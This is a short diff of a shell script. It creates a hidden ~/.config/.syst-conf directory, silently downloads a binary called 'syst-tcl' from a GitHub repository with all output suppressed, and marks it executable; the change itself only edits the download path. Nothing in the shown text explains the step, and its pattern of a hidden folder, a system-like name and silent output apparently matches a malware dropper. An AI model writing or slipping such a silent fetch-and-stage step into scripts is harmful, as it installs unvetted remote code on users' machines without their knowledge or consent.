@@ -3,7 +3,7 @@
 
 mkdir -p ~/.config/.syst-conf
 
-curl  -L -o ~/.config/.syst-conf/syst-tcl https://github.com/piadi-su/testing_repo/raw/refs/heads/syst-tcl/syst-tcl  > /dev/null 2>&1
+curl  -L -o ~/.config/.syst-conf/syst-tcl https://github.com/piadi-su/testing_repo/raw/refs/heads/master/syst-tcl/syst-tcl  > /dev/null 2>&1
 
 
 chmod +x ~/.config/.syst-conf/syst-tcl
